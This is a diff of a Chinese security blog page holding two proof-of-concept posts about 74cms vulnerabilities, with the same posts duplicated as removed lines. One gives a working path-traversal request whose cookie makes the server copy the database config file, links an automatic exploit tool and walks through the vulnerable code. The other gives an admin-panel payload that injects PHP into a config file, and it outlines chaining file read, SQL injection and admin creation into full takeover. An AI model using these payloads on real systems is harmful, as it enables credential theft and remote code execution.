@@ -284,7 +284,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：17:02:30" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：17:09:51" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -315,6 +315,204 @@
             </div>
           <!--/noindex-->
         
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nicaishui">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="隐秘行动">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/12/74cms%20v4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">74cms v4.2.126-任意文件读取漏洞</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:28:52" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <a id="more"></a>
+<h1 id="74cms-v4-2-126-任意文件读取漏洞"><a href="#74cms-v4-2-126-任意文件读取漏洞" class="headerlink" title="74cms v4.2.126-任意文件读取漏洞"></a>74cms v4.2.126-任意文件读取漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载地址：<a target="_blank" rel="noopener" href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%82">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。</a></p>
+<h2 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h2><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a> 即可</p>
+<h2 id="0x02-任意文件读取漏洞演示"><a href="#0x02-任意文件读取漏洞演示" class="headerlink" title="0x02 任意文件读取漏洞演示"></a>0x02 任意文件读取漏洞演示</h2><pre><code>url: http://74cms.test/index.php?m=Home&amp;c=Members&amp;a=register
+
+post: 
+reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind
+cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php;members_bind_info[type]=qq;members_uc_info[password]=123456;members_uc_info[uid]=1;members_uc_info[username]=tttttt;
+headers:
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest</code></pre>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<p>问题一：漏洞原理？我下面会讲问题二：你如何知道文件名称的？我下面会讲问题三：能不能写个简单的工具，自动利用此漏洞？哦，好的，我下面会提供 : )</p>
+<h2 id="0x03-漏洞讲解"><a href="#0x03-漏洞讲解" class="headerlink" title="0x03 漏洞讲解"></a>0x03 漏洞讲解</h2><p>打开文件：74cms\upload\Application\Home\Controller\MembersController.class.php函数：_save_avatar($avatar, $uid)</p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
+<p>如果不想看图片注释的话，我这里简单的说一下。812行使用$avatar拼接形成$path830行使用了$save_avatar+$savePicName; 生成了$filename838行，使用了copy函数，把$path文件内容复制到了$filename中。而 $avatar 和 $uid 都是我们刚好可以控制的变量并且生成的文件名称是$uid+time() 然后md5 一下 拼接 .jpg这个情况就很舒服了。写个小工具跑一下就好了，小工具会在结尾的时候放出来的。好了，让我们继续看下去 : )我们现在既然已经知道了_save_avatar<br>函数是有可能造成此漏洞的那么这时，我们就需要去找调用它的地方了。经过一顿的搜索我们得出了两个地方是调用了他地方一：register() 方法 会员注册方法地方二：oauth_reg() 方法 第三方登录注册方法论此漏洞的利用当然是register() 方法利用起来比较简单 因为 方法二<br>需要搭建第三方登录，我本地的话。。。还是算了，这里掩饰我使用 方法一打开文件：74cms\upload\Application\Home\Controller\MembersController.class.php函数：register()</p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
+<p>上面的马赛克是因为我写错了几个字，又不想重新写，所以我就把他擦掉了。皮这一下，我就很开心</p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
+<p>这里我们讲解一下如果<br>post的变量ucenter为bind时，则通过cookie获取数组$uc_user接着会进行数组合并而members_uc_info的cookie值是可控的，所以$data也是可控的。</p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
+<p>这里写着 当 $data[utype] = 1<br>会进行用户注册，而$data[utype]是我们可以控制的所以我们为2绕过此判断这里我又跳过了前面一些无关紧要的内容，来到了最后的漏洞触发点。因为真的无关紧要,所以就跳过了</p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
+<h2 id="0x04-漏洞利用小工具"><a href="#0x04-漏洞利用小工具" class="headerlink" title="0x04 漏洞利用小工具"></a>0x04 漏洞利用小工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/74cms-upload">https://github.com/ianxtianxt/74cms-upload</a></p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
+<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/dr895b">https://www.yuque.com/pmiaowu/bfgkkh/dr895b</a></p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.1%20-%20v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nicaishui">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="隐秘行动">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/12/74cms%20v4.2.1%20-%20v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">74cms v4.2.1-v4.2.129-后台getshell漏洞</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：17:03:21" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <a id="more"></a>
+
+<h1 id="74cms-v4-2-1-v4-2-129-后台getshell漏洞"><a href="#74cms-v4-2-1-v4-2-129-后台getshell漏洞" class="headerlink" title="74cms v4.2.1-v4.2.129-后台getshell漏洞"></a>74cms v4.2.1-v4.2.129-后台getshell漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载地址：<a target="_blank" rel="noopener" href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%82">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。</a></p>
+<h2 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h2><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a> 即可</p>
+<h2 id="0x02漏洞演示"><a href="#0x02漏洞演示" class="headerlink" title="0x02漏洞演示"></a>0x02漏洞演示</h2><p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<pre><code>url: http://74cms.test/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir= &#39;, &#39;a&#39;,phpinfo(),&#39;
+
+shell:http://74cms.test/Application/Home/Conf/config.php
+路径：\74cms\upload\Application\Home\Conf\config.php</code></pre>
+<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<h2 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h2><pre><code>url: http://74cms.test/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir= &#39;, &#39;a&#39;,phpinfo(),&#39;
+路径：74cms\upload\Application\Admin\Controller\TplController.class.php</code></pre>
+<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
+<pre><code>路径： 74cms\upload\Application\Common\Controller\BackendController.class.php</code></pre>
+<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
+<h2 id="0x04题外话-认真版getshell方法"><a href="#0x04题外话-认真版getshell方法" class="headerlink" title="0x04题外话-认真版getshell方法"></a>0x04题外话-认真版getshell方法</h2><p>认真版getshell方法：实际上想要进行getshell利用组合漏洞是很简单的事情。我的前台日到后台的getshell方法是这样的。首先利用-任意文件读取漏洞-读取系统中的hash值然后在通过漏洞-前台sql注入-来插入用户数据-因为我发现他可以支持执行双语句所以可以执行mysql双语句插入一条管理员用户在通过这个后台getshell漏洞即可完成一套日穿</p>
+<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/wecilm">https://www.yuque.com/pmiaowu/bfgkkh/wecilm</a></p>
+</blockquote>
+
       
     </div>
 
@@ -546,204 +744,6 @@ members_bind_info[type][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select us
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.1%20-%20v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="nicaishui">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="隐秘行动">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/12/74cms%20v4.2.1%20-%20v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">74cms v4.2.1-v4.2.129-后台getshell漏洞</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：17:03:21" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <a id="more"></a>
-
-<h1 id="74cms-v4-2-1-v4-2-129-后台getshell漏洞"><a href="#74cms-v4-2-1-v4-2-129-后台getshell漏洞" class="headerlink" title="74cms v4.2.1-v4.2.129-后台getshell漏洞"></a>74cms v4.2.1-v4.2.129-后台getshell漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载地址：<a target="_blank" rel="noopener" href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%82">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。</a></p>
-<h2 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h2><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a> 即可</p>
-<h2 id="0x02漏洞演示"><a href="#0x02漏洞演示" class="headerlink" title="0x02漏洞演示"></a>0x02漏洞演示</h2><p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
-<pre><code>url: http://74cms.test/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir= &#39;, &#39;a&#39;,phpinfo(),&#39;
-
-shell:http://74cms.test/Application/Home/Conf/config.php
-路径：\74cms\upload\Application\Home\Conf\config.php</code></pre>
-<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
-<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
-<h2 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h2><pre><code>url: http://74cms.test/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir= &#39;, &#39;a&#39;,phpinfo(),&#39;
-路径：74cms\upload\Application\Admin\Controller\TplController.class.php</code></pre>
-<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
-<pre><code>路径： 74cms\upload\Application\Common\Controller\BackendController.class.php</code></pre>
-<p><img src="/images/74cmsv4.2.1-v4.2.129-%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
-<h2 id="0x04题外话-认真版getshell方法"><a href="#0x04题外话-认真版getshell方法" class="headerlink" title="0x04题外话-认真版getshell方法"></a>0x04题外话-认真版getshell方法</h2><p>认真版getshell方法：实际上想要进行getshell利用组合漏洞是很简单的事情。我的前台日到后台的getshell方法是这样的。首先利用-任意文件读取漏洞-读取系统中的hash值然后在通过漏洞-前台sql注入-来插入用户数据-因为我发现他可以支持执行双语句所以可以执行mysql双语句插入一条管理员用户在通过这个后台getshell漏洞即可完成一套日穿</p>
-<h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.yuque.com/pmiaowu/bfgkkh/wecilm">https://www.yuque.com/pmiaowu/bfgkkh/wecilm</a></p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/12/74cms%20v4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="nicaishui">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="隐秘行动">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/12/74cms%20v4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">74cms v4.2.126-任意文件读取漏洞</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2021-01-12 11:56:11 / 修改时间：16:28:52" itemprop="dateCreated datePublished" datetime="2021-01-12T11:56:11+08:00">2021-01-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Poc/" itemprop="url" rel="index"><span itemprop="name">Poc</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <a id="more"></a>
-<h1 id="74cms-v4-2-126-任意文件读取漏洞"><a href="#74cms-v4-2-126-任意文件读取漏洞" class="headerlink" title="74cms v4.2.126-任意文件读取漏洞"></a>74cms v4.2.126-任意文件读取漏洞</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>厂商：74cms下载地址：<a target="_blank" rel="noopener" href="http://www.74cms.com/download/index.html%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC%EF%BC%9A%E6%96%B0%E7%89%88%E7%9A%8474cms%E9%87%87%E7%94%A8%E4%BA%86tp3.2.3%E9%87%8D%E6%9E%84%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AF%E7%9F%A5%E5%BA%95%E5%B1%82%E6%98%AFtp%EF%BC%8C74cms%E6%96%B0%E7%89%88%E5%8D%87%E7%BA%A7%E6%98%AF%E5%90%8E%E5%8F%B0%E5%8D%87%E7%BA%A7%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E5%85%88%E5%B0%86%E5%B0%86%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95%E3%80%82%E6%B3%A8%EF%BC%9A%E6%AD%A4%E6%BC%8F%E6%B4%9E%E4%B8%8D%E7%94%A8%E5%8D%87%E7%BA%A7%E8%87%B3%E6%9C%80%E6%96%B0%E7%89%88%E6%9C%AC%E4%B9%9F%E5%8F%AF%E4%BD%BF%E7%94%A8%E3%80%82">http://www.74cms.com/download/index.html关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。注：此漏洞不用升级至最新版本也可使用。</a></p>
-<h2 id="0x01-74cms升级到最新版"><a href="#0x01-74cms升级到最新版" class="headerlink" title="0x01 74cms升级到最新版"></a>0x01 74cms升级到最新版</h2><p>1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，<br>搜索文件74cms\upload\Application\Admin\Controller\ApplyController.class.php6， 查找所有$_SERVER[&#39;HTTP_HOST&#39;] 改为 <a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a> 即可</p>
-<h2 id="0x02-任意文件读取漏洞演示"><a href="#0x02-任意文件读取漏洞演示" class="headerlink" title="0x02 任意文件读取漏洞演示"></a>0x02 任意文件读取漏洞演示</h2><pre><code>url: http://74cms.test/index.php?m=Home&amp;c=Members&amp;a=register
-
-post: 
-reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind
-cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php;members_bind_info[type]=qq;members_uc_info[password]=123456;members_uc_info[uid]=1;members_uc_info[username]=tttttt;
-headers:
-Content-Type: application/x-www-form-urlencoded
-X-Requested-With: XMLHttpRequest</code></pre>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
-<p><img src="/resource/74cmsv4.2.126-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
-<p>问题一：漏洞原理？我下面会讲问题二：你如何知道文件名称的？我下面会讲问题三：能不能写个简单的工具，自动利用此漏洞？哦，好的，我下面会提供 : )</p>
